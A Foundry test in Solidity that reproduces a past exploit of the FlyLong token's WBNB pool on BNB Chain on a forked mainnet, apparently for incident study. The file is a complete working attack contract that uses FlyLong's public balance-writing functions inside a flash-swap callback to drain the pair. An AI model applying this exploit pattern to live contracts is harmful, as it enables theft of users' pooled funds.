// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 1.73 BNB
// Attacker : 0xd4e11065267421F88c0cf7a7791d84D8Fdd7d42B
// Attack Contract : 0xC8e256A41d0ac7fD8D9ac31C0ae1942DC5EF8419
// Vulnerable Contract : 0x9cA66a67dC3d77bEb59DC11cAf96677843797c08
// Attack Tx : https://bscscan.com/tx/0x45f6a7df540933b3d2b1a275fcbfc146bbd48934ffb6635c4839d8590a9efc88
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x9cA66a67dC3d77bEb59DC11cAf96677843797c08#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/968
//
// Attack summary: The attacker borrowed almost all WBNB from the FlyLong/WBNB pair, then used
// FlyLong.tokenMarketing and FlyLong.tradingTake in the Pancake callback to forge the pair's FlyLong
// balance and satisfy the pair's K check.
// Root cause: FlyLong exposes public balance-writing controls to any low-BNB-balance caller.

address constant ATTACKER = 0xD4E11065267421F88C0Cf7A7791D84D8Fdd7D42B;
address constant ROOT_ATTACK_CONTRACT = 0x9b45c1f7a01378C6490c3fDC01dd392842cfAAC7;
address constant TRACE_HELPER = 0xC8e256A41d0Ac7fd8d9ac31c0Ae1942dC5Ef8419;
address constant FLYLONG_TOKEN = 0x9cA66a67dC3d77bEb59DC11cAf96677843797c08;
address constant FLYLONG_WBNB_PAIR = 0x27c0E529b3aA9289686dAf7ea12C9aCBcC3bb9A8;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
string constant DEFAULT_BSC_RPC_URL = "https://bsc-mainnet.public.blastapi.io";

interface IFlyLong {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function tokenMarketing(
        address sellFromLiquidity
    ) external;
    function tradingTake(
        address isMarketing,
        uint256 swapAuto
    ) external;
    function tokenSwap() external view returns (bool);
}

interface IPancakePairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IWBNBLike {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function withdraw(
        uint256 amount
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    receive() external payable {}

    function setUp() public {
        vm.createSelectFork(vm.envOr("BSC_RPC_URL", DEFAULT_BSC_RPC_URL), 48_768_031);

        fundingToken = address(0);
        attacker = address(this);

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(ROOT_ATTACK_CONTRACT, "Root Attack Contract");
        vm.label(TRACE_HELPER, "Trace Helper");
        vm.label(FLYLONG_TOKEN, "FlyLong");
        vm.label(FLYLONG_WBNB_PAIR, "FlyLong/WBNB Pair");
        vm.label(WBNB_TOKEN, "WBNB");
    }

    function testExploit() public balanceLog {
        assertEq(IPancakePairLike(FLYLONG_WBNB_PAIR).token0(), FLYLONG_TOKEN);
        assertEq(IPancakePairLike(FLYLONG_WBNB_PAIR).token1(), WBNB_TOKEN);
        assertFalse(IFlyLong(FLYLONG_TOKEN).tokenSwap());
        assertEq(IWBNBLike(WBNB_TOKEN).balanceOf(FLYLONG_WBNB_PAIR), 1_726_035_104_006_254_735);
        assertEq(IFlyLong(FLYLONG_TOKEN).balanceOf(FLYLONG_WBNB_PAIR), 99_999_999_999_999_999_999_999_999);

        FlyLongDrainAttack attack = new FlyLongDrainAttack(payable(address(this)));
        attack.run();

        assertLt(IWBNBLike(WBNB_TOKEN).balanceOf(FLYLONG_WBNB_PAIR), 0.001 ether);
        assertGt(address(this).balance, 1.72 ether);
    }
}

contract FlyLongDrainAttack {
    address payable private immutable profitReceiver;

    receive() external payable {}

    constructor(
        address payable _profitReceiver
    ) {
        profitReceiver = _profitReceiver;
    }

    function run() external {
        uint256 pairWbnb = IWBNBLike(WBNB_TOKEN).balanceOf(FLYLONG_WBNB_PAIR);
        uint256 amountOut = pairWbnb * 9999 / 10_000;
        IPancakePairLike(FLYLONG_WBNB_PAIR).swap(0, amountOut, address(this), abi.encode(FLYLONG_WBNB_PAIR));

        uint256 wbnbProfit = IWBNBLike(WBNB_TOKEN).balanceOf(address(this));
        IWBNBLike(WBNB_TOKEN).withdraw(wbnbProfit);

        (bool ok,) = profitReceiver.call{value: address(this).balance}("");
        require(ok, "profit transfer failed");
    }

    function pancakeCall(
        address,
        uint256,
        uint256,
        bytes calldata
    ) external {
        require(msg.sender == FLYLONG_WBNB_PAIR, "unexpected pair");

        IFlyLong flyLong = IFlyLong(FLYLONG_TOKEN);
        flyLong.tokenMarketing(address(this));

        uint256 pairTokenBalance = flyLong.balanceOf(FLYLONG_WBNB_PAIR);
        flyLong.tradingTake(FLYLONG_WBNB_PAIR, pairTokenBalance * 100_000);
    }
}
